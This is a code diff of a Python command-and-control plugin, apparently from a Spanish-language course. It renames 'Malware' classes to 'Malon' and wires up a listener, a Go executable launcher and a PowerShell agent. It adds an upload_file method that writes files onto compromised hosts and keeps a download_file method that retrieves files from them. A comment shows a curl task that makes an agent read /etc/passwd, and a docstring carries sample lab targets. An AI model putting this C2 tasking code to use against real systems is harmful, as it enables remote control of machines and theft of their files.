@@ -18,8 +18,8 @@ import shlex
 import base64
 
 
-class MalwareC2(C2):
-    name = 'Malon__curso'
+class MalonC2(C2):
+    name = 'Malon_curso'
     description = 'Integracion propuesta'
     documentation = 'no disponible'
     registered_options = [
@@ -35,21 +35,30 @@ class MalwareC2(C2):
     def __init__(self, *args, **kwargs) -> None:
         super().__init__(*args, **kwargs)
         self._listener_types = {
-            MalwareListener.name: MalwareListener(
+            MalonListener.name: MalonListener(
                 self.options['url'],
                 self
             ),
         }
         self._launcher_types = {
-        MalwareGenericLauncher.name:MalwareGenericLauncher(self.options['url'], self),
+        MalonGenericLauncher.name:MalonGenericLauncher(self.options['url'], self),
         }
 
         self._agent_types = {
-            'powershell': MalwareAgent(self.options['url'], self),
+            'powershell': MalonAgent(self.options['url'], self),
         }
 
     def get_session(self) -> aiohttp.ClientSession:
         return aiohttp.ClientSession(connector=aiohttp.TCPConnector(ssl=False))
+
+    async def get_listener_types(self) -> Iterable[ListenerType]:
+        return self._listener_types
+
+    async def get_launcher_types(self) -> Iterable[LauncherType]:
+        return self._launcher_types
+
+    async def get_agent_types(self) -> Iterable[LauncherType]:
+        return self._agent_types
 
     async def is_alive(self) -> bool:
         try:
@@ -67,14 +76,6 @@ class MalwareC2(C2):
         except aiohttp.ClientError as er:
             raise ConnectionError(repr(er))
 
-    async def get_listener_types(self) -> Iterable[ListenerType]:
-        return self._listener_types
-
-    async def get_launcher_types(self) -> Iterable[LauncherType]:
-        return self._launcher_types
-
-    async def get_agent_types(self) -> Iterable[LauncherType]:
-        return self._agent_types
 
     async def retrieve_agents(self, dto: Dict[str, Any]) -> bytes:
         try:
@@ -101,8 +102,8 @@ class MalwareC2(C2):
         except aiohttp.client_exceptions.ClientConnectorError as err:
             raise ConnectionError(err)
 
-class MalwareListener(ListenerType):
-    name = 'malware-http-cifrado'
+class MalonListener(ListenerType):
+    name = 'malon-http-cifrado'
     description = 'conexion a traves de http cifrado'
     registered_options = [
         OptionDesc(
@@ -142,7 +143,7 @@ class MalwareListener(ListenerType):
         ),
     ]
 
-    def __init__(self, url: str, _c2: MalwareC2) -> None:
+    def __init__(self, url: str, _c2: MalonC2) -> None:
         self._url = url
         self._c2 = _c2
 
@@ -196,7 +197,7 @@ class MalwareListener(ListenerType):
                     raise ResourceNotFoundError(
                         'Error fetching listeners: {}'.format(result))
 
-class MalwareGenericLauncher(LauncherType):
+class MalonGenericLauncher(LauncherType):
     name = 'Generic compiled GO executable'
     description = 'Un ejecutable compilado cross-plataforma'
     registered_options = [
@@ -209,7 +210,7 @@ class MalwareGenericLauncher(LauncherType):
         ),
     ]
 
-    def __init__(self, url: str,  _c2: MalwareC2) -> None:
+    def __init__(self, url: str,  _c2: MalonC2) -> None:
         self._url = url
         self._c2 = _c2
 
@@ -234,10 +235,10 @@ class MalwareGenericLauncher(LauncherType):
         except aiohttp.client_exceptions.ClientConnectorError as err:
             raise ConnectionError(err)
 
-class MalwareAgent(AgentType):
+class MalonAgent(AgentType):
     shell_type = 'powershell'
 
-    def __init__(self, url: str, _c2: MalwareC2) -> None:
+    def __init__(self, url: str, _c2: MalonC2) -> None:
         self._url = url
         self._c2 = _c2
 
@@ -283,11 +284,15 @@ class MalwareAgent(AgentType):
         except aiohttp.client_exceptions.ClientConnectorError as err:
             raise ConnectionError(err)
 
-    async def download_file(self, dto: Dict[str, Any]) -> bytes:
+    async def upload_file(self, dto: Dict[str, Any]) -> bytes:
+        """
+        {'c2_type': 'Malon_curso', 'c2_options': {'url': 'http://127.0.0.1:5000'}, 'listener_type': 'malon-http-cifrado', 'listener_options': {'target host': '192.168.174.128', 'target port': '7777', 'bind host': '192.168.174.128', 'bind port': '7777', 'connection interval': '1000'}, 'listener_internal_id': '1', 'agent_internal_id': '9865526f6e772b6aa4eafc32406ef22c', 'agent_shell_type': 'powershell', 'target_directory': '/Users/criso/Desktop/', 'file_name': 'banana.txt', 'file_content': 'cHVjYXJhCg=='}
+        """
         try:
+            logger.info('dto: %r', dto)
             # curl localhost:5000/agents/68bf60312d85bbee7a4153909bad9906/tasks/ -d '{"type": "file", "info": {"type": "get", "file_path": "/etc/passwd"}}' -H'Content-Type: application/json'
             target = '{}/agents/{}/tasks'.format(self._url, dto['agent_internal_id'])
-            interact_post_data = {"type": "file", "info": {"type": "get", "file_path": dto['file_path']}}
+            interact_post_data = {"type": "file", "info": {"type": "put", "file_path": dto['target_directory']+ dto['file_name']},  "input":dto['file_content']}
             logger.debug('target: %r, data: %r', target, interact_post_data)
 
             response_dto = {}
@@ -297,22 +302,55 @@ class MalwareAgent(AgentType):
                     command_response_json = await response.json()
                     command_output_id = command_response_json.get('id')
 
-            task_status_target = '{}/agents/{}/tasks/{}/result'.format(self._url, command_output_id)
+            task_status_target = '{}/agents/{}/tasks/{}/result'.format(self._url,dto['agent_internal_id'], command_output_id)
             for _ in range(40):
                 async with self._c2.get_session() as session:
-                    async with session.get(task_status_target,  headers=headers) as response:
-                        command_response_json = await response.json()
+                    async with session.get(task_status_target) as response:
+                        task_result_list = await response.json()
                         for task_result in task_result_list:
                             output_encoded = task_result.get('output')
                             if output_encoded is not None:
                                 logger.info('command_response_json: %r', output_encoded)
-                                response_dto['content'] = base64.b64decode(output_encoded).decode('utf-8')
+                                response_dto['content'] = output_encoded
                                 return response_dto
-                        if status == 'completed':
-                            break
-                        else:
+                        try:
                             await asyncio.sleep(1)
+                        except asyncio.CancelledError:
+                            pass
         except aiohttp.client_exceptions.ClientConnectorError as err:
             raise ConnectionError(err)
+
+    async def download_file(self, dto: Dict[str, Any]) -> bytes:
+            try:
+                # curl localhost:5000/agents/68bf60312d85bbee7a4153909bad9906/tasks/ -d '{"type": "file", "info": {"type": "get", "file_path": "/etc/passwd"}}' -H'Content-Type: application/json'
+                target = '{}/agents/{}/tasks'.format(self._url, dto['agent_internal_id'])
+                interact_post_data = {"type": "file", "info": {"type": "get", "file_path": dto['file_path']}}
+                logger.debug('target: %r, data: %r', target, interact_post_data)
+
+                response_dto = {}
+                command_output_id = ''
+                async with self._c2.get_session() as session:
+                    async with session.post(target, json=interact_post_data) as response:
+                        command_response_json = await response.json()
+                        command_output_id = command_response_json.get('id')
+
+                task_status_target = '{}/agents/{}/tasks/{}/result'.format(self._url,dto['agent_internal_id'], command_output_id)
+                for _ in range(40):
+                    async with self._c2.get_session() as session:
+                        async with session.get(task_status_target) as response:
+                            task_result_list = await response.json()
+                            for task_result in task_result_list:
+                                output_encoded = task_result.get('output')
+                                if output_encoded is not None:
+                                    logger.info('command_response_json: %r', output_encoded)
+                                    response_dto['content'] = output_encoded
+                                    return response_dto
+                            try:
+                                await asyncio.sleep(1)
+                            except asyncio.CancelledError:
+                                pass
+            except aiohttp.client_exceptions.ClientConnectorError as err:
+                raise ConnectionError(err)
+
 
 
